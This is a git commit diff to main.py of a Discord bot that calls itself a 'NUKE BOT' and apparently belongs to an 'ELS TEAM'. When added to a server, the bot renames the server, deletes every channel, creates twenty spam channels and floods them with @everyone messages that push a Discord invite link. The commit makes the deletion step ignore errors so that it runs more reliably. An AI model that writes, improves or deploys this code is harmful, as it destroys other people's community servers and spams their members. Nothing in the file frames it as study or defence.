53788103817814be7f399f2ddea22988fb8cbe41
pravshadiscord <167679493+pravshadiscord@users.noreply.github.com>
2024-04-22 00:43:57 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
-import discord, asyncio
+import discord
+import asyncio
 from discord.ext import commands
 
 intents = discord.Intents.all()
@@ -7,19 +8,22 @@ bot = commands.Bot(command_prefix="?", intents=intents)
 @bot.event
 async def on_ready():
     await bot.change_presence(status=discord.Status.online, activity=discord.Game("NUKE  BOT  ^^"))
-    
+
 @bot.event
 async def on_guild_join(guild):
     await guild.edit(name="NUKED BY ELS TEAM")
 
     channels_to_delete = guild.channels
-    channels_deletion_tasks = [channel.delete() for channel in channels_to_delete]
-    await asyncio.gather(*channels_deletion_tasks)
+    for channel in channels_to_delete:
+        try:
+            await channel.delete()
+        except:
+            pass
 
     channels_to_create = [f'by-elsteam' for i in range(20)]
     channels_creation_tasks = [guild.create_text_channel(name) for name in channels_to_create]
     await asyncio.gather(*channels_creation_tasks)
-    
+
 @bot.event
 async def on_guild_channel_create(channel):
     counter = 0
@@ -27,5 +31,5 @@ async def on_guild_channel_create(channel):
         await channel.send('**@everyone СРОЧНЫЙ ПЕРЕЕЗД:**\nhttps://discord.gg/URP9bzRTSV')
         counter += 1
         await asyncio.sleep(0.5)
-    
+
 bot.run("сюда токен")
